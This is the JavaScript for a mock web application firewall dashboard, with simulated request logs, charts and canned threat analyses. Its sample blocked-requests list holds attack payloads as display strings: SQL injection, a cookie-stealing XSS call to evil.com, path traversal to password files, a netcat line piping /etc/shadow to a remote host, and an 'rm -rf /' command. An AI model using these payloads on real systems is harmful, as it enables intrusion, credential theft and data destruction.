function dashboardApp() {
        return {
          mobileMenuOpen: false,
          isLoading: true,
          isPaused: false,
          exportStatus: 'idle',
          searchQuery: '',
          statusFilter: 'ALL',
          threatSearchQuery: '',
          currentTab: localStorage.getItem('sibyl_tab') || "overview",
          chartPeriod: "6H",
          crimeCoefficient: 42,
          currentTime: "",
          modalOpen: false,
          selectedLog: null,
          nav: [
            {
              id: "overview",
              label: "Overview",
              icon: '<svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6A2.25 2.25 0 016 3.75h2.25A2.25 2.25 0 0110.5 6v2.25a2.25 2.25 0 01-2.25 2.25H6a2.25 2.25 0 01-2.25-2.25V6zM3.75 15.75A2.25 2.25 0 016 13.5h2.25a2.25 2.25 0 012.25 2.25V18a2.25 2.25 0 01-2.25 2.25H6A2.25 2.25 0 013.75 18v-2.25zM13.5 6a2.25 2.25 0 012.25-2.25H18A2.25 2.25 0 0120.25 6v2.25A2.25 2.25 0 0118 10.5h-2.25a2.25 2.25 0 01-2.25-2.25V6zM13.5 15.75a2.25 2.25 0 012.25-2.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-2.25a2.25 2.25 0 01-2.25-2.25v-2.25z"/></svg>',
            },
            {
              id: "threats",
              label: "Threats",
              icon: '<svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126z"/></svg>',
            },
            {
              id: "analytics",
              label: "Analytics",
              icon: '<svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3 13.125C3 12.504 3.504 12 4.125 12h2.25c.621 0 1.125.504 1.125 1.125v6.75C7.5 20.496 6.996 21 6.375 21h-2.25A1.125 1.125 0 013 19.875v-6.75zM9.75 8.625c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125v11.25c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V8.625zM16.5 4.125c0-.621.504-1.125 1.125-1.125h2.25C20.496 3 21 3.504 21 4.125v15.75c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V4.125z"/></svg>',
            },
            {
              id: "settings",
              label: "Settings",
              icon: '<svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.324.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 011.37.49l1.296 2.247a1.125 1.125 0 01-.26 1.431l-1.003.827c-.293.24-.438.613-.431.992a6.759 6.759 0 010 .255c-.007.378.138.75.43.99l1.005.828c.424.35.534.954.26 1.43l-1.298 2.247a1.125 1.125 0 01-1.369.491l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.57 6.57 0 01-.22.128c-.331.183-.581.495-.644.869l-.213 1.28c-.09.543-.56.941-1.11.941h-2.594c-.55 0-1.02-.398-1.11-.94l-.213-1.281c-.062-.374-.312-.686-.644-.87a6.52 6.52 0 01-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 01-1.369-.49l-1.297-2.247a1.125 1.125 0 01.26-1.431l1.004-.827c.292-.24.437-.613.43-.992a6.932 6.932 0 010-.255c.007-.378-.138-.75-.43-.99l-1.004-.828a1.125 1.125 0 01-.26-1.43l1.297-2.247a1.125 1.125 0 011.37-.491l1.216.456c.356.133.751.072 1.076-.124.072-.044.146-.087.22-.128.332-.183.582-.495.644-.869l.214-1.281z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>',
            },
          ],
          stats: [
            {
              label: "Total Evaluated",
              value: "12,847",
              color: "text-white",
              trend: 12,
            },
            {
              label: "Threats Blocked",
              value: "342",
              color: "text-red-400",
              trend: 8,
            },
            {
              label: "Cache Hit Rate",
              value: "67%",
              color: "text-cyan-400",
              trend: 3,
            },
            {
              label: "Avg Latency",
              value: "84ms",
              color: "text-emerald-400",
              trend: -5,
            },
          ],
          threatTypes: [
            { name: "SQL Injection", count: 142, color: "#ef4444" },
            { name: "XSS", count: 89, color: "#f59e0b" },
            { name: "Path Traversal", count: 67, color: "#8b5cf6" },
            { name: "RCE", count: 44, color: "#06b6d4" },
          ],
          logs: [],
          analyticsChartsInit: false,
          blockedRequests: [
            {time:'00:42:18',ip:'45.33.32.156',vector:'SQLi',target:'/api/login',score:95,payload:"' OR 1=1 -- (password field)"},
            {time:'00:38:55',ip:'185.220.101.34',vector:'XSS',target:'/api/search',score:88,payload:'\x3cscript\x3edocument.cookie\x3c/script\x3e'},
            {time:'00:35:12',ip:'23.129.64.210',vector:'Path Traversal',target:'/api/config',score:92,payload:'../../../../etc/passwd'},
            {time:'00:31:47',ip:'103.152.220.44',vector:'RCE',target:'/api/upload',score:96,payload:'eval(base64_decode("cGhwaW5mbygpOw=="))'},
            {time:'00:28:03',ip:'91.219.236.18',vector:'SQLi',target:'/api/users',score:91,payload:'UNION SELECT username,password FROM users--'},
            {time:'00:24:19',ip:'45.33.32.156',vector:'CMDi',target:'/api/data',score:85,payload:'; cat /etc/shadow | nc 45.33.32.156 4444'},
            {time:'00:20:44',ip:'185.220.101.34',vector:'XSS',target:'/wp-admin',score:87,payload:'\x3cimg onerror=fetch("//evil.com/"+document.cookie)\x3e'},
            {time:'00:17:08',ip:'103.152.220.44',vector:'RCE',target:'/api/admin',score:94,payload:'__import__("os").system("rm -rf /")'},
            {time:'00:13:22',ip:'23.129.64.210',vector:'Path Traversal',target:'/api/config',score:82,payload:'..\\..\\..\\windows\\system32\\config\\sam'},
            {time:'00:09:51',ip:'91.219.236.18',vector:'SQLi',target:'/api/login',score:93,payload:"admin'; DROP TABLE users;--"}
          ],
          get filteredLogs() {
            return this.logs.filter(l => {
              const matchSearch = l.ip.includes(this.searchQuery) || l.path.toLowerCase().includes(this.searchQuery.toLowerCase()) || l.reason.toLowerCase().includes(this.searchQuery.toLowerCase());
              const matchStatus = this.statusFilter === 'ALL' || l.status === this.statusFilter;
              return matchSearch && matchStatus;
            });
          },
          get filteredThreats() {
            return this.blockedRequests.filter(b => {
              return b.ip.includes(this.threatSearchQuery) || b.vector.toLowerCase().includes(this.threatSearchQuery.toLowerCase()) || b.payload.toLowerCase().includes(this.threatSearchQuery.toLowerCase());
            });
          },
          openModal(logData, source) {
            let log = { ...logData };
            if (source === 'live') {
              log.vector = log.reason.split(':')[0] || 'Unknown';
              log.target = log.path;
              log.payload = log.reason.includes('SQL') ? "' OR 1=1 --" : (log.reason.includes('XSS') ? "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e" : "N/A");
              if (log.status === 'PASSED') { log.vector = 'None'; log.payload = 'Safe Request'; }
            } else {
              log.method = 'POST';
              log.status = 'BLOCKED';
            }
            log.headers = `Host: target-app.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept: */*\nConnection: keep-alive\nX-Forwarded-For: ${log.ip}`;
            
            if (log.status === 'PASSED') {
              log.aiAnalysis = "Traffic appears normal. No malicious patterns detected. Request safely forwarded to upstream application.";
            } else if (log.vector.includes('SQL')) {
              log.aiAnalysis = "High probability of SQL Injection attempt detected. Payload attempts to bypass authentication or extract data. Recommendation: Ensure parameterized queries are used across the target endpoint. Sibyl-WAF has blocked the request.";
            } else if (log.vector.includes('XSS')) {
              log.aiAnalysis = "Cross-Site Scripting (XSS) payload detected in request. Attacker is attempting to inject executable scripts. Recommendation: Implement strict Content Security Policy (CSP) and ensure output encoding on the application side.";
            } else {
              log.aiAnalysis = "Malicious pattern matching known signature for " + log.vector + ". Recommendation: Review endpoint security and rate limit the attacking IP.";
            }
            
            this.selectedLog = log;
            this.modalOpen = true;
          },
          closeModal() {
            this.modalOpen = false;
            setTimeout(() => this.selectedLog = null, 300);
          },
          exportData() {
            if (this.exportStatus !== 'idle') return;
            this.exportStatus = 'exporting';
            setTimeout(() => {
              // Generate CSV content from current logs
              const headers = ['Time', 'IP Address', 'Method', 'Path', 'Score', 'Status', 'Reason'];
              const csvRows = [headers.join(',')];
              
              this.logs.forEach(log => {
                const row = [
                  log.time,
                  log.ip,
                  log.method,
                  log.path,
                  log.score,
                  log.status,
                  `"${log.reason.replace(/"/g, '""')}"`
                ];
                csvRows.push(row.join(','));
              });
              
              const csvString = csvRows.join('\n');
              const blob = new Blob([csvString], { type: 'text/csv' });
              const url = window.URL.createObjectURL(blob);
              
              const a = document.createElement('a');
              a.href = url;
              a.download = `sibyl-waf-logs-${new Date().toISOString().slice(0, 10)}.csv`;
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              window.URL.revokeObjectURL(url);
              
              this.exportStatus = 'done';
              setTimeout(() => this.exportStatus = 'idle', 2000);
            }, 800);
          },
          init() {
            this.updateTime();
            setInterval(() => this.updateTime(), 1000);
            
            setTimeout(() => {
              this.isLoading = false;
              this.generateLogs();
              this.initTrafficChart();
              this.initThreatChart();
            }, 1500);

            setInterval(() => {
              if (!this.isPaused && !this.isLoading) this.addLog();
            }, 4000);
            this.$watch('currentTab', (val) => {
              localStorage.setItem('sibyl_tab', val);
              if (val === 'analytics' && !this.analyticsChartsInit) {
                this.analyticsChartsInit = true;
                setTimeout(() => { this.initResponseChart(); this.initHourlyChart(); }, 300);
              }
            });
          },
          updateTime() {
            const d = new Date();
            this.currentTime =
              d.toLocaleTimeString("en-US", { hour12: false }) + " UTC";
          },
          generateLogs() {
            const ips = [
              "192.168.1." + Math.floor(Math.random() * 255),
              "10.0.0." + Math.floor(Math.random() * 255),
              "172.16.0." + Math.floor(Math.random() * 255),
              "45.33.32.156",
              "104.248." +
                Math.floor(Math.random() * 255) +
                "." +
                Math.floor(Math.random() * 255),
            ];
            const paths = [
              "/api/login",
              "/api/users",
              "/api/admin",
              "/api/search?q=test",
              "/api/upload",
              "/api/config",
              "/wp-admin",
              "/api/data",
            ];
            const methods = ["GET", "POST", "PUT", "DELETE"];
            const threats = [
              {
                s: 95,
                st: "BLOCKED",
                r: "SQL Injection detected in password field",
              },
              { s: 88, st: "BLOCKED", r: "XSS payload in query parameter" },
              {
                s: 92,
                st: "BLOCKED",
                r: "Path traversal attempt: ../../etc/passwd",
              },
              { s: 12, st: "PASSED", r: "Normal authentication request" },
              {
                s: 5,
                st: "PASSED",
                r: "Standard API call, no threat indicators",
              },
              {
                s: 78,
                st: "BLOCKED",
                r: "Remote code execution attempt via eval()",
              },
              { s: 8, st: "PASSED", r: "Legitimate search query" },
              {
                s: 85,
                st: "BLOCKED",
                r: "Command injection in user-agent header",
              },
              { s: 3, st: "PASSED", r: "Health check endpoint" },
              {
                s: 91,
                st: "BLOCKED",
                r: "Encoded SQLi bypass attempt detected",
              },
              { s: 15, st: "PASSED", r: "Normal form submission" },
              { s: 82, st: "BLOCKED", r: "Directory enumeration attempt" },
            ];
            for (let i = 0; i < 15; i++) {
              const t = threats[Math.floor(Math.random() * threats.length)];
              const h = String(Math.floor(Math.random() * 24)).padStart(2, "0");
              const m = String(Math.floor(Math.random() * 60)).padStart(2, "0");
              const s = String(Math.floor(Math.random() * 60)).padStart(2, "0");
              this.logs.push({
                time: h + ":" + m + ":" + s,
                ip: ips[Math.floor(Math.random() * ips.length)],
                method: methods[Math.floor(Math.random() * methods.length)],
                path: paths[Math.floor(Math.random() * paths.length)],
                score: t.s,
                status: t.st,
                reason: t.r,
                visible: true,
              });
            }
            this.logs.sort((a, b) => b.time.localeCompare(a.time));
          },
          addLog() {
            const ips = [
              "203.0.113." + Math.floor(Math.random() * 255),
              "198.51.100." + Math.floor(Math.random() * 255),
            ];
            const paths = [
              "/api/login",
              "/api/admin",
              "/api/users",
              "/api/search",
            ];
            const methods = ["GET", "POST"];
            const threats = [
              { s: 93, st: "BLOCKED", r: "SQL Injection: UNION SELECT attack" },
              { s: 87, st: "BLOCKED", r: "Reflected XSS in search parameter" },
              { s: 6, st: "PASSED", r: "Normal GET request" },
              {
                s: 79,
                st: "BLOCKED",
                r: "Base64 encoded RCE payload detected",
              },
            ];
            const t = threats[Math.floor(Math.random() * threats.length)];
            const d = new Date();
            const time =
              String(d.getHours()).padStart(2, "0") +
              ":" +
              String(d.getMinutes()).padStart(2, "0") +
              ":" +
              String(d.getSeconds()).padStart(2, "0");
            const log = {
              time,
              ip: ips[Math.floor(Math.random() * ips.length)],
              method: methods[Math.floor(Math.random() * methods.length)],
              path: paths[Math.floor(Math.random() * paths.length)],
              score: t.s,
              status: t.st,
              reason: t.r,
              visible: true,
            };
            this.logs.unshift(log);
            if (this.logs.length > 50) this.logs.pop();
            if (t.st === "BLOCKED") {
              this.crimeCoefficient = Math.min(
                100,
                this.crimeCoefficient + Math.floor(Math.random() * 8),
              );
            } else {
              this.crimeCoefficient = Math.max(
                10,
                this.crimeCoefficient - Math.floor(Math.random() * 3),
              );
            }
          },
          initTrafficChart() {
            const ctx = document.getElementById("trafficChart");
            if (!ctx) return;
            const labels = [
              "00:00",
              "02:00",
              "04:00",
              "06:00",
              "08:00",
              "10:00",
              "12:00",
              "14:00",
              "16:00",
              "18:00",
              "20:00",
              "22:00",
            ];
            new Chart(ctx, {
              type: "line",
              data: {
                labels,
                datasets: [
                  {
                    label: "Total Requests",
                    data: [
                      120, 98, 85, 110, 245, 380, 420, 510, 480, 390, 310, 180,
                    ],
                    borderColor: "#06b6d4",
                    backgroundColor: "rgba(6,182,212,.08)",
                    fill: true,
                    tension: 0.4,
                    borderWidth: 2,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                  },
                  {
                    label: "Blocked",
                    data: [5, 3, 2, 8, 22, 35, 28, 42, 38, 25, 18, 12],
                    borderColor: "#ef4444",
                    backgroundColor: "rgba(239,68,68,.05)",
                    fill: true,
                    tension: 0.4,
                    borderWidth: 2,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                  },
                ],
              },
              options: {
                responsive: true,
                maintainAspectRatio: false,
                interaction: { intersect: false, mode: "index" },
                plugins: {
                  legend: {
                    display: true,
                    labels: {
                      color: "#6b7280",
                      font: { size: 10, family: "Inter" },
                      boxWidth: 12,
                      padding: 16,
                    },
                  },
                },
                scales: {
                  x: {
                    grid: { color: "rgba(255,255,255,.03)" },
                    ticks: {
                      color: "#4b5563",
                      font: { size: 10, family: "Fira Code" },
                    },
                  },
                  y: {
                    grid: { color: "rgba(255,255,255,.03)" },
                    ticks: {
                      color: "#4b5563",
                      font: { size: 10, family: "Fira Code" },
                    },
                  },
                },
              },
            });
          },
          initThreatChart() {
            const ctx = document.getElementById("threatChart");
            if (!ctx) return;
            new Chart(ctx, {
              type: "doughnut",
              data: {
                labels: this.threatTypes.map((t) => t.name),
                datasets: [
                  {
                    data: this.threatTypes.map((t) => t.count),
                    backgroundColor: this.threatTypes.map((t) => t.color),
                    borderWidth: 0,
                    hoverOffset: 8,
                  },
                ],
              },
              options: {
                responsive: true,
                maintainAspectRatio: false,
                cutout: "72%",
                plugins: { legend: { display: false } },
              },
            });
          },
          initResponseChart() {
            const ctx = document.getElementById('responseChart');
            if (!ctx) return;
            new Chart(ctx, { type: 'bar', data: { labels: ['<20ms','20-50ms','50-100ms','100-200ms','200-500ms','500ms+'], datasets: [{ label: 'Request Count', data: [1240,3860,4120,2340,890,120], backgroundColor: ['#06b6d4','#06b6d4','#06b6d4','#f59e0b','#ef4444','#ef4444'], borderWidth: 0, borderRadius: 0 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { grid: { color: 'rgba(255,255,255,.03)' }, ticks: { color: '#4b5563', font: { size: 10, family: 'Fira Code' } } }, y: { grid: { color: 'rgba(255,255,255,.03)' }, ticks: { color: '#4b5563', font: { size: 10, family: 'Fira Code' } } } } } });
          },
          initHourlyChart() {
            const ctx = document.getElementById('hourlyChart');
            if (!ctx) return;
            new Chart(ctx, { type: 'line', data: { labels: Array.from({length:24},(_, i) => String(i).padStart(2,'0')+':00'), datasets: [{ label: 'Requests', data: [45,32,28,22,18,25,68,142,210,285,320,380,410,395,350,310,340,380,290,220,180,120,85,55], borderColor: '#06b6d4', backgroundColor: 'rgba(6,182,212,.08)', fill: true, tension: 0.4, borderWidth: 2, pointRadius: 0, pointHoverRadius: 3 }, { label: 'Threats', data: [2,1,0,1,0,1,5,12,18,24,28,32,35,30,25,22,28,30,20,15,10,8,4,2], borderColor: '#ef4444', backgroundColor: 'rgba(239,68,68,.05)', fill: true, tension: 0.4, borderWidth: 2, pointRadius: 0, pointHoverRadius: 3 }] }, options: { responsive: true, maintainAspectRatio: false, interaction: { intersect: false, mode: 'index' }, plugins: { legend: { labels: { color: '#6b7280', font: { size: 10, family: 'Inter' }, boxWidth: 12 } } }, scales: { x: { grid: { color: 'rgba(255,255,255,.03)' }, ticks: { color: '#4b5563', font: { size: 9, family: 'Fira Code' }, maxTicksLimit: 12 } }, y: { grid: { color: 'rgba(255,255,255,.03)' }, ticks: { color: '#4b5563', font: { size: 10, family: 'Fira Code' } } } } } });
          },
        };
      }
